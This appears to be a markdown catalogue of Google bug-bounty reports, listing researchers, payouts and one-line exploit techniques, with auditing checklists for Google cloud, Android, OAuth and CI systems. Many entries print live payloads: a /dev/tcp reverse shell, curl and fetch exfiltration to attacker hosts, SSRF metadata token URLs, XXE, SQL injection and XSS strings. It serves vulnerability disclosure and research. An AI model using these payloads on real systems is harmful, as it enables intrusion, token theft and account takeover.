+`citations?view_op=manage_labels#u=data:text/html;base64,…` loads attacker HTML into a dialog on `scholar.google.com`.
+
+### #76 — $233,700 — Lahcen Merroun — Groups redacted email reconstruction
+`GET /g/{group}/members?q=email:abc*` returns `class="LnLepd"` only on hit; iterate prefix to reconstruct redacted `ab****@gmail.com` characters.
+
+### #77 — $233,700 — Jinseo Kim — Caja playground SSRF
+`https://caja.appspot.com/#http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` returns the access token with `cloud-platform` scope.
+
+### #78 — $187,500 — Jatin — Google Keep `VoiceActionActivity` exported
+`adb shell am start-activity -a com.google.android.gms.actions.CREATE_NOTE --es android.intent.extra.TEXT testing com.google.android.keep/.activities.VoiceActionActivity` lets any 3rd-party app create / delete / update notes.
+
+### #79 — $150,000 — VirusTotal arbitrary-email signup
+Sign up `victim@target.com` (no email control), then sign up `victim1` with attacker email, base64-decode activation token `victim1||timestamp||hash` → re-balance to `victim||1<timestamp>||hash` → activates the first account, granting access to enterprise groups by email domain.
+
+### #80 — $150,000 — Basavaraj Banakar — AppSheet Apigee SSRF
+`OpenAPI Spec URL` fetches server-side; pointing to `http://169.254.169.254` returns metadata folder index.
+
+### #81 — $133,700 — Seqrity — Members-only YouTube videos via Gemini 2.5
+Paste members-only video URL into AI Studio; Gemini transcribes and frame-by-frame describes paid content.
+
+### #82 — $133,700 — Ben Kallus — GCP LB extra-spaces cache poisoning
+`GET /      HTTP/1.1` forwarded with extra spaces; CDN keys under `/`, Lighttpd<1.4.77 / FastHTTP 404 for `/         ` → cached 404 served for `/`.
+
+### #83 — $133,700 — Jakub Domeracki — Cloud VRP — Firebase idToken without `email_verified`
+`identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSy…` registers `jdoe@google.com` with `email_verified=false`. `Authorization: Bearer <FIREBASE_JWT>` then succeeds against `partner-companion.cloud.google/api/feedback-list` and other admin endpoints.
+
+### #84 — $133,700 — Ritik Singh — `knowyourdata-tfds.withgoogle.com` LFI
+`/assets/onboarding//..%2f..%2f..%2f..%2f..%2f..%2f__init__.py` reads source.
+
+### #85 — $133,700 — Apigee Rhino ClassShutter sandbox bypass
+JavaCallout instantiates an object with `run()` payload, stuffs it in a flow variable, JavaScript policy retrieves and calls `run()` — different policies with different security models share state.
+
+### #86 — $133,700 — Apigee header injection via positional set
+`context.setVariable("request.header.customHeader.1", "value\r\nInjectedHeader: x")` bypasses the newline filter that only applies when setting by name.
+
+### #87 — $133,700 — Apigee LookupCache `postDeserialize()` RCE
+Cache entry that implements `com.apigee.util.PostDeserializer` runs `postDeserialize()` outside Java Permissions; populate via PopulateCache, retrieve via LookupCache → arbitrary Java RCE / reverse shell.
+
+### #88 — $133,700 — Rebane — Docs arbitrary-sheet linking one-click leak
+Link/embed any spreadsheet ID via captured POST `…/save`. Victim sees an "UPDATE" button overlayed with custom image; clicking pulls target sheet content into attacker's doc.
+
+### #89 — $133,700 — sithi — GMS confused-deputy across Android users
+`ACTION_PICK` returns `content://10@media/external/images/media/<id>` (cross-user URI prefix). GMS reads with `INTERACT_ACROSS_USERS` and shows the image (e.g. another user's photos / contact pics) in the profile-photo crop.
+
+### #90 — $133,700 — Vaibhav Prajapati — `script.google.com` access-control caching
+Once an Apps Script deployment is published with `Anyone Google Account`, switching to `Only Myself` does not invalidate active sessions of other users.
+
+### #91 — $133,700 — Vatsal Vaishy — `pre-prod.whereismytrain.in` PostgreSQL SQLi
+`train_no` POST param to `/mt/submit_change_in_status` is error-based.
+
+### #92 — $112,500 — NDevTK — Google App webapp install spoof via intent
+`location.href='intent://search.app.goo.gl/?link=…name=Chrome…icon=…&query=https://attacker#Intent;package=com.google.android.googlequicksearchbox;end&apn=…#Intent;package=com.google.android.gms;…'` shows install prompt without origin and with attacker-chosen icon; can also bypass home-screen step.
+
+### #93 — $50,000 — `userByEmail` GraphQL on `witschool-prod-gql-api`
+Polish course platform; any authenticated user issues `userByEmail(email:"victim@example.com")` returning name, profile, Stripe customerId, `isPaid`, etc.
+
+### #94 — $50,000 — Muhammad Aqib Nazeer — `one.google.com/ai-student` org admin dashboard
+Workspace user opens link, ignores switch-account, clicks Google One logo → lands on org-wide stats dashboard.
+
+### #95 — $50,000 — Shakbany — Waymo Careers email-only takeover
+Submit candidate-settings with target email and blank name → logged in as that account.
+
+### #96 — $50,000 — Shakbany — `zombo.googleprod.com/horde/login.php` SQLi
+`app='+(select*from(select(sleep(20)))a)+'` time-based MySQL.
+
+### #97 — $50,000 — Shubham Deshmukh — Open Chronograf InfluxDB on `216.73.89.76:8083`
+Admin without login on `/sources/1/status`.
+
+### #98 — $50,000 — OSS-Fuzz `pr_helper.yml` JS injection
+PR creates `projects/new-project-which-does-not-exist/whatever/project.yaml` with `main_repo:"aa'+require('child_process').execSync(atob('YmFzaCAtYyAnaWQ7ZW52Jw==')).toString()+'bb"`. Python script writes that into `MESSAGE` env var, JS step interpolates → RCE; `pull-requests: write` token forges `Ready to merge` label.
+
+### #99 — $50,000 — Abhishek Mathur — Firestore Node SDK private-key leak via JSON.stringify
+All Firestore objects internally reference firestore `_settings` containing the SA private key; default JSON.stringify exposes it. Fixed via PR #1742; later spelling-fix `toJSON` (#1989) plugged a regression — see report #168 below.
+
+### #100 — $50,000 — Saptak Saha — Fitbit private foods IDOR
+`/foods/Private+Food+1/<id>/edit` lets any logged-in user enumerate other users' private foods/brands.
+
+### #101 — $50,000 — GMS in-app browser exposes JS bridge `mm`
+Long click-trail leads to a "private" browser without parental controls and exposing `addEncryptionRecoveryMethod`, `setVaultSharedKeys`, `closeView` — a pinned-app bypass surface.
+
+### #102 — $50,000 — Mo Sakr — Cloud Tools for Eclipse OAuth chain
+Plugin's OAuth `redirect_uri=http://localhost:8080/_ah/login?continue=http://attacker.com/collect` — App Engine local server's `_ah/login` is an open redirect; clicking Log out/Log in posts the OAuth code via Referer to the attacker.
+
+### #103 — $50,000 — Mo Sakr — Cloud Tools for Eclipse XXE
+Opens `appengine-web.xml` with default XML parser; external DTD `<!ENTITY % file "file:///etc/passwd">` exfiltrates files via `evil.dtd`.
+
+### #104 — $50,000 — Celesian — HPC Toolkit nginx alias traversal
+`location /static { alias ../hpc-toolkit/community/front-end/website/static/; }` (location lacks trailing `/`); `/static../website/settings.py` reads source.
+
+### #105 — $50,000 — Ryan Kovatch — Nest Pro Portal admin verification bypass
+PATCH `/v1/organizations/{id}?updateMask=status` with `{"status":"APPROVED"}` self-approves a Nest Pro org; impersonate businesses to install Nest x Yale lock devices.
+
+### #106 — $50,000 — Andre — Google Sites accept arbitrary GTM container ID
+Frontend-only validation of GA ID; submit any `GTM-XXX` ID server-side and Google Tag Manager loads on `*.sites.google.com` outside of the iframe sandbox.
+
+### #107 — $50,000 — Ben Chinoy — `androidenterprise.dev` ContentDocument IDOR
+Salesforce ContentDocument query lists all private user uploads (config files, IMEI, stack traces with admin passwords, MP4 of user device sessions); each `contentdocument/<id>` and `download/<id>` is reachable by any registered user.
+
+### #108 — $50,000 — VirusTotal `VT_SESSION_ID` 4-byte brute
+Decoded sessions differ in 4–5 bytes between users; brute, then sign up a user whose username matches the candidate to mint a `VT_SESSION_ID` with valid signature; bypass `Referer:http://127.0.0.1` to skip extra checks; read API key from `/ui/users/<username>`.
+
+### #109 — $50,000 — Shubhang Borkar — Firebase Dynamic Links cross-tenant
+With any APK's `google_crash_reporting_api_key` (`X-Android-Package` and `X-Android-Cert` taken from APK), call `firebasedynamiclinks.googleapis.com/v1/shortLinks` to mint links under any `*.page.link` belonging to other apps.
+
+### #110 — $50,000 — Basavaraj Banakar — AppSheet Apigee SSRF redirect bypass
+Blocked-localhost filter bypassed via attacker `302.php?url=http://localhost:20202` (Fluent bit prometheus exporter exposed).
+
+### #111 — $50,000 — Shivam Singh KiNg — `opensourcelive.withgoogle.com` PUT→GET IDOR
+`PUT /api/user_profiles/{id}` (update email) downgraded to `GET /api/user_profiles/{id}` returns email/first/last name of any user.
+
+### #112 — $50,000 — `primer.googlecnapps.cn` IDOR — change another user's selected skills via `userId/userIdEncrypt` in `updateSelectedSkillsAndAuthStutas`.
+
+### #113 — $50,000 — Quang Vo — Kaggle `CreateKernelSession` IDOR
+Specifying `kernelVersionId` of a private notebook owned by another user creates a session that runs in your account but linked to their kernel; some downstream APIs (`ListDockerImages`, `UpdateUserKernelFirestoreAuth`) leak details/sessions.
+
+### #114 — $50,000 — Plastic SCM (`owlchemylabs.com`) admin reset
+`/account/register` lets any user set the admin password without prior auth; full server config + DB creds.
+
+### #115 — $50,000 — Daniel Wallace — `motus.area120.com` Firebase Storage list
+Any signed-in user can list `firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/` and download Firestore/Datastore exports containing user data and Stripe IDs.
+
+### #116 — $50,000 — Jatin — `GmsSubscribedFeedsProvider` exported with no permission
+`adb shell content query --uri content://com.google.android.gms.subscribedfeeds/accounts` returns Google account list and sync feeds without any Android permission.
+
+### #117 — $50,000 — Mustafa Ahmed — `remotedesktop.google.com/support/session/<code>` CSRF
+Visiting attacker-controlled URL with the access code triggers a permission prompt on the victim showing the attacker's email, enabling targeted reconnaissance.
+
+### #118 — $50,000 — Carmelo Ventimiglia — Data Studio shareable link Referer leak
+External link click leaks the report URL; rewriting `/reporting/<id>/page/...` → `/open/<id>` opens it for the attacker.
+
+### #119 — $50,000 — Sayaan Alam — Google knowledge panel "Suggest Edit" CID swap
+Intercept and replace own CID with target's — receives "owner suggestion" confirmation email (`noreply-feedback@google.com`).
+
+### #120 — $50,000 — Anze Jensterle — `partnerdash.google.com/waze` partner data
+Any rejected Waze partner applicant retains `partnersvc/getPartner` access, returning private contact info and Google `approverEmail` for any partner ID.
+
+### #121 — $50,000 — Jinseo Kim — Voice activity audio brute via `<audio>`
+`https://myactivity.google.com/history/audio/play/<numeric>?authuser=0` plays in an `<audio>` tag on any site; Recorder.js dumps voice data.
+
+### #122 — $20,000 — Maniesh Neupane — `api-lb.fitbit.com` exposes Solar EV dashboard
+Open signup; after login URL becomes `/guest`; trim → unrelated Solar EV management dashboard.
+
+### #123 — $20,000 — Jakub Domeracki — `partner-companion.cloud.google` Stored XSS via persistent notification
+Unauth POST `/api/notifications` accepts a persistent notification; `link` field flows to `window.open()` (no CSP/Trusted Types). Use `javascript://%0aeval(atob('…'))` to exfiltrate `gpau_id` (Firebase OIDC) from `localStorage`.
+
+### #124 — $20,000 — Ahmed Nasr — `appsheet.com` `frames:listTuplesByUpdateTime` CORS
+`xhr.withCredentials=true` cross-origin POST returns frames data of any user when attacker knows the `frameId`.
+
+### #125 — $20,000 — Armaan Pathan — Stored XSS in Kaggle profile display name
+`\" + alert(document.domain)` payload in display name fires on profile reload.
+
+### #126 — $10,100 — Pentagrid AG — `gmail-oauth2-tools/oauth2.py` SSL not validated
+Python's `imaplib.IMAP4_SSL`/`smtplib.starttls()` without explicit SSL context skips cert verification → MITM can capture XOAUTH2 tokens.
+
+### #127 — $10,100 — Mo Sakr — Cloud Tools for Eclipse Login CSRF
+OAuth flow misses `state` param; local HTTP callback server accepts attacker's `code` → IDE deploys to attacker GCP project.
+
+### #128 — $10,000 — NDevTK — `app.signalpath.com` PDF.js (CVE-2024-4367) XSS
+Outdated PDF.js viewer at `/trialpath/assets/pdfjs/web/viewer.html` allows XSS via crafted PDF (open file / drag-and-drop). Verily Site CTMS holds patient PII.
+
+### #129 — $10,000 — Vasilii Ermilov — `alloydb-java-connector` CI GITHUB_TOKEN leak
+`pull_request_target` triggered after auto-label on PR title; `actions/checkout` runs without `persist-credentials: false`; PR-supplied `.kokoro/build.sh` runs `find $HOME/work -type f -name config | xargs cat | curl --data @- http://attacker` to exfiltrate the token (write on issues + id-token).
+
+### #130 — $10,000 — Ritik Singh — Reflected XSS on `portal.photomath.net/api/terms/latest?type=`.
+
+### #131 — $10,000 — XSS on `granularinsurance.com/?s=` with `test"><%0ascript>warning(document.domain)<%0a/script>`.
+
+### #132 — $10,000 — Vijay Kumar — `identity-dev.api.verily.com/UnverifyEmail?return=javascript:alert(domain)` stored XSS chain.
+
+### #133 — $10,000 — Numan Khan — `terra-devel-flagsmith.api.verily.com` IDOR creates master-API-keys for other Flagsmith organisations.
+
+### #134 — $10,000 — Jainam Shah — Kaggle Mathjax `\href` + `\style` XSS / CSS injection
+Stored XSS via `$$ \href{javascript:alert(1)}{Click Me!} $$` in dataset description; CSS injection via `\style{...}{CSS}`. Cookies are not httpOnly → cookie theft → 1-click ATO.
+
+### #135 — $10,000 — Google Drive macOS installer LPE
+Postinstall script `chmod u+s` on `load_dfsfuse`/`mount_dfsfuse`/`mount_helper` without checking symlinks. Pre-create `/Applications/Google Drive.app/Contents/MacOS/` as non-root, race-replace the binary with a symlink to `/opt/local/bin/fish` → setuid root shell.
+
+### #136 — $10,000 — Amgad Esam — Issue Tracker markdown link/URL parsing
+Accepts `ftp://`, integer-as-IP, `[text](ftp:/google.com@evil.com)`, `[text](ftp:%67%6f%6f%67%6c%65...)`. Tab-nabbing surface.
+
+### #137 — $10,000 — Fitbit `healthsolutions` DOM XSS via search → ATO
+`jQuery.after()` and `element.innerHTML` consume search input; cookies same as `fitbit.com`. Wordpress `/wp-json/wp/v2/users` enumerates admin emails; `slug` with hyphens converts to email by replacing with `.` or `@`.
+
+### #138 — $10,000 — `exporteducationprogram.googlecnapps.cn` CSRF clear data
+POST `/appacademy/api/clear` accepts cross-origin form with empty body to wipe progress.
+
+### #139 — $10,000 — Irwan One — `creators.google/api/forgetme/` GET-method CSRF deletes account.
+
+### #140 — $10,000 — Rio Mulyadi Pulungan — `games.withgoogle.com/prepareforlaunch` stored XSS via project name.
+
+### #141 — $10,000 — Aman Singh — Reflected XSS in `waze.com/carpool/companies?city=`.
+
+### #142 — $10,000 — Alva Radian — `cloud.withgoogle.com/next/` XSS via Identity Toolkit signup `displayName` (escape encoded payload in burp before forward).
+
+### #143 — $10,000 — Stored XSS in Kaggle datasets discussion via `$$ \unicode{<img src=1 onerror=alert(document.cookie)//} $$` (CSP-bypassed by browser flag in PoC; demonstrates injection).
+
+### #144 — $10,000 — Gaurav Bhatia — `support.google.com/android/thread/` Exif geolocation not stripped from uploaded community images.
+
+### #145 — $10,000 — Shobhit Srivastav — GSoC 2021 page Angular template injection `{{[]."-alert\`1\`-"}}` makes org page unreadable for both users.
+
+### #146 — $10,000 — Tushar Bhardwaj — `waze.com/editor` CSRF on map comments (no CSRF token).
+
+### #147 — $10,000 — Rio Mulyadi Pulungan — Blind XSS in `experiments.withgoogle.com/admin/experiments` via submit form.
+
+### #148 — $10,000 — Valentin Slawicek — Fabric/Crashlytics XSS via crash stacktrace + fake re-login on `fabric.io/login`.
+
+## $0 — accepted-without-bounty / out-of-scope acquisitions / partial credit
+
+### #149 — Erfan Sheikhi — `photobooth.flutter.dev` Firebase Storage takeover
+Public `apiKey` from `__/firebase/init.js` → `accounts:signUp` → `Authorization: Bearer <idToken>` to overwrite arbitrary objects in `io-photobooth-20667.appspot.com` bucket.
+
+### #150 — kernelCTF exp424: net/xfrm UAF (COS-6.6.105 / Linux ≤6.16.9)
+Commit 94f39804d891 ("xfrm: Duplicate SPI Handling") removed the SPI-zero check in `alloc_spi_xfrm`; objects with SPI=0 stay in `net.xfrm.by_spi` after free. `xfrm_state_update` looks up by SPI 0 and triggers UAF.
+
+### #151 — Sean Geofrey — YouTube Studio Closure `goog.loadModuleFromSource_` RCE
+`COMPILED=false` shipped to prod studio.youtube.com → `goog.loadModule(function(exports){ fetch("https://collab/log?cookie="+document.cookie); return exports; });` exfiltrates SID, SAPISID, `__Secure-*PAPISID` — full account takeover, bypasses CSP/Trusted Types via internal eval.
+
+### #152 — David Weatherspoon & Amber — Guava `maven-bundle-plugin` 5.1.8 (CVE-2021-42036)
+Vulnerable plugin in `futures/failureaccess/pom.xml` invocable via build inputs; commit-access prerequisite, but supply-chain critical.
+
+### #153 — buddurid — Civetweb stack-exhaustion DoS in SSI `<!--#include file="self.shtml" -->` and heap BOF in `handle_request()` 301-redirect path (`mg_get_request_link` undercount).
+
+### #154 — Ritik Singh — Python traceback exposing filepath at `devicecertification.youtube/.%c0`.
+
+### #155 — k1rnt — Gemini Fullstack LangGraph quickstart path traversal `app/{path:path}` → `/etc/shadow`, `.env`.
+
+### #156 — RAVI KUMAR — `pages.mandiant.com/version` exposes service versions and commit hashes for fingerprinting.
+
+### #157 — Jakub Domeracki — Cloud VRP — GAR yum/dnf plugin URL validation
+`'pkg.dev' in url` and `'-yum.pkg.dev/' in baseurl` allow `https://attacker.com/mirror?=test-yum.pkg.dev/` to receive the `Authorization: Bearer <SA access token>` (default scope `cloud-platform`). Fix: `parsed_url.netloc.endswith('.pkg.dev')`.
+
+### #158 — Syed Shahwar Ahmad — `androidenterprise.dev` account-deletion missing CSRF token.
+
+### #159 — `mkto-sj380051.com` (CNAME from `email.mandiant.com`) HTTPS certificate mismatch.
+
+### #160 — Akbar Kustirama — Reflected XSS on Google acquisition `span.sproute.net/signin/?email=`.
+
+### #161 — Kavindu Pasan — Issue Tracker bug titles exposed via Bugcrowd payment imports / CSV export.
+
+### #162 — Ankit Kapoor — IDX shared-workspace session persists after access removal.
+
+### #163 — loay morad — Reflected XSS on `admin.cameyo.com/login/command` `entityId` param.
+
+### #164 — Tiger Huang — Google leaking 60+ IXP LAN segments to GCP customers via BGP.
+
+### #165 — GCP Composer env-var → reverse shell across dag processor / triggerer / worker / webserver
+`composer.environments.update` lets you set `PYTHONWARNINGS="all:0:antigravity.x:0:0"` and `BROWSER="/bin/bash -c 'bash -i >& /dev/tcp/attacker/19980 0>&1' & #%s"`; every Python invocation triggers reverse shell on all 4 maintained machines (steal SAL DB, signing keys, Composer SA token).
+
+### #166 — NDevTK — Google Scholar PDF Reader extension SOP bugs
+Fetch arbitrary JSON cross-origin via content-script bridge; embed PDF then nested-frame-redirect to attacker-CSP'd page that fetches and reads same-origin response.
+
+### #167 — NDevTK — Google App Scene Viewer launches arbitrary `intent://` (BROWSABLE bypass)
+Scene-viewer URL with `link=` param starts arbitrary intents bypassing Chromium's CATEGORY_BROWSABLE protection.
+
+### #168 — Abhishek Mathur — Firestore Node SDK `toJson` vs `toJSON` spelling
+Original `toJson` never invoked by `JSON.stringify`; spelling fix in PR #1989 closed the leak shown in report #99.
+
+### #169 — Drive macOS app Child Injection bypasses TCC isolation
+`open -a "Google Drive" --args --debugger_command "/Applications/iTerm.app/Contents/MacOS/iTerm2"` spawns iTerm with Drive's `com.apple.security.personal-information.photos-library` entitlement.
+
+### #170 — Mohamed Zain — `pacoapp.com/csSearch` JSON SQLi (MySQL)
+`{"select":["database()"], "query":{"criteria":"experiment_id=? and ...", "values":[4939133602758656]}, ...}` via `select` field.
+
+### #171 — Pravas Ranjan Kanungo — Firebase Admin role can read/modify Test Lab (out of advertised role scope).
+
+### #172 — Jatin — Calendar deeplink RSVP without consent
+`adb shell am start-activity -d 'https://calendar.google.com/calendar/event?eid=<target_eid>&action=RESPOND&rst=2'` responds Yes/No/Maybe on victim's behalf. `eid` is base64 `<event_id> <email>@m`; reconstruct target's by replacing the `@m` part.
+
+### #173 — NDevTK — Web Vitals extension URL leak via `chrome.storage.local.get(null, …)`.
+
+### #174 — NDevTK — AMP Readiness Tool extension `chrome.runtime.sendMessage({id:'get_apps', tab:{id:''}})` returns any tab's HTML.
+
+### #175 — NDevTK — Firebase Dynamic Links open arbitrary intents (e.g. Samsung Browser) bypassing Chromium's prompt for non-default browsers.
+
+### #176 — Ayush Sahu — Verily Atlassian Jira service-desk signup grants admin (delete/edit) and `/rest/api/2/dashboard?maxResults=100` info disclosure.
+
+### #177 — Vaidik Pandya — HTML injection in `bughunters.google.com` review.
+
+### #178 — Aditya Singh — `console.cloud.google.com/apis` profile picture EXIF geolocation not stripped on `googleapis` storage uploads.
+
+### #179 — NDevTK — XSS on `websdk.ujet.co` via chat message URL `https://"onmousemove="alert(window.origin)"` and waiting-message `<img src=x onerror=alert(window.origin)>`.
+
+### #180 — NDevTK — XSS on `*.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);//` via iframe.
+
+### #181 — Krishna Gupta — Google Ads Bulk Actions IDOR (variant of #41).
+
+### #182 — `python-docs-samples` `example_task_handler` reflected XSS via POST body chained with CSRF (Content-Type text/html).
+
+### #183 — Composer Apache Airflow `secret_key="some-random-id"` privilege escalation
+Sign cookies for arbitrary `user_id` (e.g. id=1 admin) with `flask-unsign --sign --secret 'some-random-id' --cookie ...`. Works from Viewer or Public role.
+
+### #184 — `transparencyreport.google.com` page jitter from injected payload (low severity).
+
+### #185 — Ali Hassan Khan — `siemplify.co` exposed `composer.json`, `package.json`, `vendor/composer/installed.json`, `web.config`.
+
+### #186 — Pwdec — HTML injection in `bughunters.google.com/learn/search?q=`.
+
+### #187 — Vaidik Pandya — Stored XSS / HTML injection in `mitre.siemplify.co/org/8/user` profile name.
+
+### #188 — Issam Hbib — YouTube Studio Android task hijacking via missing `taskAffinity` (StrandHogg v1).
+
+### #189 — Basavaraj Banakar — `appsheet.com/Support` HTML/iframe injection in `dFR[doc_type][0]=` to harvest creds via fake form.
+
+### #190 — Naveen Kumar — `ads-resources-legacy.waze.com` outdated nginx 1.4.6 (potentially CVE-2014-0133 SPDY).
+
+### #191 — ARJUN SINGH SiKARWAR — AppSheet user invite OAuth provider tampering (admin restricted to Apple → user signs up with Google).
+
+### #192 — David Schütz — Google Search "Scholarly articles for…" links served over HTTP (passive eavesdropping, MITM).
+
+### #193 — Jaydev Ahire — Stored XSS in `run.qwiklabs.com/my_account` via name fields.
+
+### #194 — smaury — Google Filament glTF arbitrary OOB read in `Animator::createSampler` via broken-URI buffer (data=NULL) + attacker-controlled offsets.
+
+### #195 — Nehal Pillai — `applieddigitalskills.withgoogle.com` IDOR — append `/course/classcode#units` to view class units of unrelated classes.
+
+### #196 — Christopher Menon — Android Google Password Autofill biometric requirement disabled without authentication.
+
+### #197 — Anurag Kumar Rawat — Appsheet portfolio `partner` hidden input leaks owner email — enumerate by ID.
+
+### #198 — Shivam Singh KiNg — `marketfinder.thinkwithgoogle.com/user_data/` `profile_id` IDOR adds attacker as collaborator without consent.
+
+### #199 — Vatsal Vaishy — `whereismytrain.in/mt/change_in_status` PostgreSQL SQLi (error/stacked/time-based) on `train_date`.
+
+### #200 — Daniele — Nearby Connections WiFi pivot
+P2P_STAR strategy: malicious advertiser switches discoverer's WiFi to attacker AP, sets default route via DHCP — captures all victim Internet traffic.
+
+### #201 — Sunil Bhati — `bitium.com/2/users/sign_in` user-id IDOR exposes name, password length, support email.
+
+---
+
+## Cross-cutting checklists
+
+### When auditing GCP Classic App LB:
+- bare CR after method (`GET\r /`) — cache poisoning if origin = Lighttpd/Tornado/CherryPy/libsoup/libevent.
+- bare CR inside chunk-ext BWS (`2\r\r;a\r\n`) — request smuggling to Node.
+- non-ASCII bytes in header names (`\xa0`, `\x85`) — request smuggling to Gunicorn<22 / any Python `str.strip`.
+- multiple SP after request-target (`GET /     HTTP/1.1`) — cache poisoning to Lighttpd<1.4.77 / FastHTTP.
+- bare CR in arbitrary header values forwarded to backend.
+
+### When auditing GitHub Actions on a Google org:
+- `pull_request_target` without label gating, or label gating provided by `auto-label` bot triggered on PR title/body.
+- `workflow_run` triggered by attacker-named workflow.
+- `actions/checkout` without `persist-credentials: false`.
+- `${{ github.event.X.title|body|main_repo }}` interpolated inside `run:` or `env:` lines.
+- composite actions interpolating user inputs (`issue-title`, `issue-body`).
+- self-hosted runners that look non-ephemeral (cleanup steps, persistent home dir).
+- Maven `pom.xml` with `exec-maven-plugin` exec phase reachable from PR-supplied build.
+- repo-default `GITHUB_TOKEN` permissions; `id-token: write`, `pull-requests: write`, `issues: write` are dangerous defaults.
+
+### When auditing OAuth flows on Google products:
+- redirect_uri pointing to `localhost:_ah/login?continue=<attacker>` (App Engine local server open redirect).
+- missing `state` (CSRF).
+- `state.origin` validated with `endsWith()` instead of URL `hostname` comparison.
+- ID-token issued without `email_verified` enforcement before subsequent API calls.
+
+### When auditing GCP services with SA tokens:
+- IDE/Cloud-Shell-style products that drop creds in `.git/config`, environment variables, or instance metadata.
+- yum/dnf/apt plugins with weak URL validation (`'pkg.dev' in url`).
+- GKE workloads sharing cluster with `container.nodes.update` permission (WIF downgrade).
+- Composer / Airflow envs accepting user-set `BROWSER`, `PYTHONWARNINGS`.
+- buckets named `${project}-{region}-{service}` that the service auto-creates without ownership check (squatting).
+
+### When auditing Google Docs / Drive web-UI behavior:
+- pages allowing iframing as same-origin via YouTube/AccountsYouTube redirect chain.
+- `/edit?userstoinvite=email` auto-fill prefill.
+- iframe-disabled features that *aren't* yet protected (e.g. AI / Generate document).
+- pubhtml `single=true→false` style boolean toggles.
+
+### When auditing Google Cloud Shell / IDX / Cloud Workstations:
+- preview / extension-host iframes hosted on the same origin as the IDE.
+- `parentOrigin` from query string accepted as postMessage trust.
+- filename injection in launch.json or any debugger UI.
+- debugger proxies that fetch arbitrary URLs.
+- Login-CSRF via `_workstationAccessToken` GET param.
+
+### When auditing internal Google IPs (ASN 15169 etc.):
+- `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz` and `/java/*` variants.
+- BNS addresses, `gws-prod`, `g00gl3`, `chrome-proxy`, `root` users in environ → impact tier.
+- Look for `Default LabelACL Policy: OPEN` and `mdb/<group>` ACLs.
+
+### When auditing Apigee:
+- JavaCallout → JavaScript inter-policy state for sandbox escape.
+- LookupCache `postDeserialize()` Java RCE.
+- Hosted Targets Node.js that runs as root (`/etc/shadow`).
+- Header-injection by setting positional `request.header.foo.1` instead of name.
+
+### When auditing browser extensions Google ships:
+- `externally_connectable.matches` containing `*://*.google.com/*` and `http://`.
+- background scripts trusting `chrome.storage.local.set` from content scripts on arbitrary sites.
+- helpers that proxy fetches without origin checks.
+- compromised-renderer threat model: `chrome.runtime.sendMessage` from a content script of any URL.
+
+### When auditing Android Google apps:
+- `android:exported=true` activities/providers without permission.
+- `intent://` redirects without `CATEGORY_BROWSABLE` enforcement (Scene Viewer, Faceviewer, Firebase Dynamic Links, Google App Scene-Viewer, Play Store `market://`).
+- path traversal in attachment filenames (Drive, Gmail, Chats).
+- `taskAffinity` collisions for task hijacking (StrandHogg).
+- `content://<userId>@…` cross-user URI confused-deputy on apps with `INTERACT_ACROSS_USERS`.
+- TCC entitlement inheritance via child injection on macOS desktop builds.
+
+### When auditing acquisitions:
+- subdomain takeover / forgotten dashboards on `googleprod.com`, `googleapis.com`, `*.withgoogle.com`, `googlecnapps.cn`, `withwaymo.com`, `flutter.dev`, `apigee.com`, `area120.com`, `verily.com`, `mandiant.com`.
+- Salesforce-built sites (`partneradvantage.goog`, `androidenterprise.dev`) with object-level IDOR.
+- legacy nginx, outdated PDF.js, default-creds infra (Google Fiber printers/routers `admin/access`).
